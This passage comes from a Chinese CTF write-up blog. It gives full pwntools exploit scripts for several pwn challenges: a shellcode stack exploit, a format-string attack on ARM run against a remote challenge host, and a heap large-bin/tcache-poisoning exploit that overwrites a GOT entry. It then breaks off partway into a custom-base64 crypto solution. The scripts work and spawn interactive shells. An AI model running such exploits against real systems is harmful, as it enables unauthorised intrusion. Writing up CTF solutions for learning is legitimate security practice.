class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程</span></span><br><span class="line">sh = process(<span class="string">&quot;./ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置上下文</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 ELF 文件</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载动态链接库</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间作为种子</span></span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机数</span></span><br><span class="line">num = libc.rand() % <span class="number">160</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串偏移量</span></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload</span></span><br><span class="line">payload = <span class="string">b&#x27;%8$p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收提示信息并发送 payload</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;hello,What do you want to ask?\n&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收数据并提取栈地址</span></span><br><span class="line">buf_data = sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">buf = u64(buf_data) - <span class="number">0x90</span></span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 shellcode</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关地址</span></span><br><span class="line">leave = <span class="number">0x00000000004007f9</span></span><br><span class="line">ret = <span class="number">0x00000000004005e6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 附加调试器</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造最终 payload</span></span><br><span class="line">payload = shell.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(buf) + p64(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收提示信息并发送 payload</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;is your luck number\n&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926114202161.png" alt="image-20240926114202161"></p>
<h3 id="收获-5"><a href="#收获-5" class="headerlink" title="收获"></a>收获</h3><p>利用缓冲区溢出漏洞和随机数的特点，成功构造了攻击 payload，并获取flag，不错的一题</p>
<h2 id="pwn3-normal-pwn"><a href="#pwn3-normal-pwn" class="headerlink" title="pwn3-normal pwn"></a>pwn3-normal pwn</h2><h3 id="步骤-6"><a href="#步骤-6" class="headerlink" title="步骤"></a>步骤</h3><p>先例行分析一波</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929175339437.png" alt="image-20240929175339437"></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929175423093.png" alt="image-20240929175423093"></p>
<p>arm吗，确实没见过</p>
<p>拖到IDA分析</p>
<p>找到格式化字符串漏洞</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929180700711.png" alt="image-20240929180700711"></p>
<p>在 ARM 环境下的 pwn 中，利用格式化字符串漏洞可获取所需地址并进行修改，由于地址不变且偏移相同，可通过格式化字符串修改内存以获取 shell</p>
<p>接下来上exp：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&quot;101.200.58.4&quot;</span>, <span class="number">5555</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送指定命令索引</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;our choice: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加一个条目，指定索引和大小</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_item</span>(<span class="params">idx, size</span>):</span><br><span class="line">    send_cmd(<span class="number">97</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;a size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑指定索引的条目内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_item</span>(<span class="params">idx, content</span>):</span><br><span class="line">    send_cmd(<span class="number">101</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;a index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;content&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 展示指定索引的条目</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_item</span>(<span class="params">idx</span>):</span><br><span class="line">    send_cmd(<span class="number">115</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;ta index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加一个条目</span></span><br><span class="line">add_item(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用格式化字符串漏洞获取代码基址</span></span><br><span class="line">edit_item(<span class="number">0</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">show_item(<span class="number">0</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;ontent: &#x27;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(conn.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0xea0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用格式化字符串漏洞获取栈地址</span></span><br><span class="line">edit_item(<span class="number">0</span>, <span class="string">b&#x27;%8$p&#x27;</span>)</span><br><span class="line">show_item(<span class="number">0</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;ontent: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(conn.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload 修改栈地址</span></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((stack_addr - <span class="number">0x18</span>) &amp; <span class="number">0xffff</span>, <span class="number">8</span>)</span><br><span class="line">edit_item(<span class="number">0</span>, payload)</span><br><span class="line">show_item(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 payload 修改代码基址相关地址</span></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((code_base + <span class="number">0xd40</span>) &amp; <span class="number">0xffff</span>, <span class="number">12</span>)</span><br><span class="line">edit_item(<span class="number">0</span>, payload)</span><br><span class="line">show_item(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="收获-6"><a href="#收获-6" class="headerlink" title="收获"></a>收获</h3><p>通过对这题我理解了在 ARM 环境下利用格式化字符串漏洞进行攻击的原理和方法，同时也更加熟悉了 PWN 技巧中对远程服务器进行漏洞利用的过程。</p>
<h2 id="pwn4-no-fmtstr"><a href="#pwn4-no-fmtstr" class="headerlink" title="pwn4-no_fmtstr"></a>pwn4-no_fmtstr</h2><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤"></a>步骤</h3><p>简单分析过后没看见问题，只能拖进IDA了</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928161245844.png" alt="image-20240928161245844"></p>
<p>发现可以通过修改参数地址进行绕过</p>
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928161349967.png" alt="image-20240928161349967" style="zoom:80%;" />

<p>接着查看，发现存在ufa漏洞</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928161450358.png" alt="image-20240928161450358"></p>
<p>又看到一个大小限制的malloc申请</p>
<p>看来仅可运用 large bin attack 策略。直接瞄准 <code>mp_</code>展开攻势，随后将已释放的内存块妥善安置于 tcache 之中。值得一提的是，程序的 pie 并未发生变动。在此基础上，通过精心策划的操作，将 <code>free</code> 的 got 表项巧妙地修改为 <code>system</code>即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标二进制文件名</span></span><br><span class="line">filename = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"><span class="comment"># 连接的 URL（暂为空）</span></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 URL 中的主机名和端口号的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_hostname_and_port</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="comment"># 返回主机名和端口号，如果端口号为空则为 None</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>), <span class="keyword">match</span>.group(<span class="number">2</span>) <span class="keyword">if</span> <span class="keyword">match</span>.group(<span class="number">2</span>) <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取主机名和端口号</span></span><br><span class="line">hostname, port = extract_hostname_and_port(url)</span><br><span class="line"><span class="comment"># 调试标志，默认为 False</span></span><br><span class="line">debug_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据命令行参数处理连接方式</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;remote&#x27;</span>:</span><br><span class="line">        <span class="comment"># 远程连接</span></span><br><span class="line">        p = remote(hostname, port)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;debug&#x27;</span>:</span><br><span class="line">        <span class="comment"># 本地调试</span></span><br><span class="line">        p = process(filename)</span><br><span class="line">        debug_flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python script.py [remote|debug]&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 默认本地运行</span></span><br><span class="line">    p = process(filename)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">if</span> debug_flag:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 设置 GDB 脚本</span></span><br><span class="line">            gdbscrp = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            b * main</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            <span class="comment"># 附加 GDB 到进程</span></span><br><span class="line">            gdb.attach(p, gdbscript = gdbscrp)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;GDB attached successfully&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to attach GDB: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别为 debug，并设置终端环境</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;80&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载目标二进制文件</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加内存块的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))  <span class="comment"># 大小范围在 0x500 - 0x900</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放内存块的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑内存块内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示内存块内容的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始分配内存块</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x530</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放索引为 0 的内存块并泄露基地址</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 接收并处理输出以获取基地址</span></span><br><span class="line">base_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1f6cc0</span></span><br><span class="line">success(<span class="string">&quot;base_addr : &quot;</span> + <span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配内存块</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x530</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放索引为 2 的内存块</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑已释放的索引为 0 的内存块，填充特定内容</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次显示索引为 0 的内存块以泄露堆地址</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 接收并处理输出以获取堆地址</span></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr : &#x27;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造特定的 payload</span></span><br><span class="line">payload = p64(base_addr + <span class="number">0x1f6cc0</span>) * <span class="number">2</span> + p64(heap_addr + <span class="number">0x290</span>) + p64(base_addr + <span class="number">0x1f63b0</span> - <span class="number">0x20</span> - <span class="number">8</span>)</span><br><span class="line">success(<span class="string">&#x27;mp_.tcache_bins : &#x27;</span> + <span class="built_in">hex</span>(base_addr + <span class="number">0x1f63b0</span>))</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配内存块</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x530</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放两个较大的内存块</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下部分可能是进一步的攻击准备，但代码中暂未明确其具体用途</span></span><br><span class="line"><span class="comment"># printf_plt = 0x4010b0</span></span><br><span class="line"><span class="comment"># sh = 0x0000000004011D6</span></span><br><span class="line"></span><br><span class="line">key = (heap_addr + <span class="number">0x2800</span>) &gt;&gt; <span class="number">0xC</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0x00404020</span> ^ key))</span><br><span class="line"><span class="comment"># print(hex(0x00404020 ^ key))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x4010a6</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x4011D6</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x4010a6</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x4011D6</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>, payload)</span><br><span class="line"><span class="comment"># show(0)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得交互权限</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>利用堆漏洞进行攻击。首先根据命令行参数确定连接方式，加载二进制文件并设置环境。通过一系列的堆操作，包括分配、释放、编辑和显示内存块，利用程序中的漏洞泄露基地址和堆地址。然后构造虚假指针和篡改已释放内存块的指针，最终实现执行恶意代码并获得程序交互权限，进而获得flag。</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928162014451.png" alt="image-20240928162014451"></p>
<h3 id="收获-7"><a href="#收获-7" class="headerlink" title="收获"></a>收获</h3><p>不得不说挺综合一题，通过对一个二进制文件进行漏洞利用，包括分配和释放内存块、泄露基地址和堆地址、构造特定 payload 等操作，最终获得了程序的交互权限，获取flag。</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="crypto1-不小心"><a href="#crypto1-不小心" class="headerlink" title="crypto1-不小心"></a>crypto1-不小心</h2><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤"></a>步骤</h3><p>看到给的是一个变表的base64，只是“+”比较多</p>
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926195252166.png" alt="image-20240926195252166" style="zoom: 50%;" />

<p>在该代码逻辑中，关键部分在于首先将每个字符转换为 8 位二进制字符串，接着把 3 个二进制字符串拼接成一个 24 位的字符串，之后将这个 24 位字符串划分成 4 个 6 位的数字，再用这 4 个数字在特定的字符串 s 中找到对应的字符并拼接成最终的编码结果。倘若最后不足 3 个字符，则用等号进行补齐。</p>
<p> 基于此原理，我们能够进行反向求解。先去除末尾的等号并统计等号数量，然后找到编码字符串中每个字符在特定字符串中的索引，将这些索引转换为 6 位二进制字符串拼接后再以 8 位为一组转换回 ASCII 字符，最终拼接得到解码后的字符串。。</p>
<p>根据原理构造出EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个包含特定字符的字符串</span></span><br><span class="line">s = <span class="string">&quot;fst3Sem8Wgnobcd9+++++uv2JKpUViFGHz0QRMyjkA7NaBC14wXYxh5OP/DEqrZIl6LT&quot;</span></span><br><span class="line"><span class="comment"># 定义一个编码后的字符串</span></span><br><span class="line">encoded = <span class="string">&quot;+Se++h+mF5u0d++Oc++RbQJYbyuMb++0cYuQc+SwdmK0d+fwcYRYG+==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">encoded</span>):</span><br><span class="line">    <span class="comment"># 统计编码字符串中&#x27;=&#x27;的数量</span></span><br><span class="line">    num_equals = encoded.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    <span class="comment"># 去除编码字符串末尾的&#x27;=&#x27;</span></span><br><span class="line">    encoded = 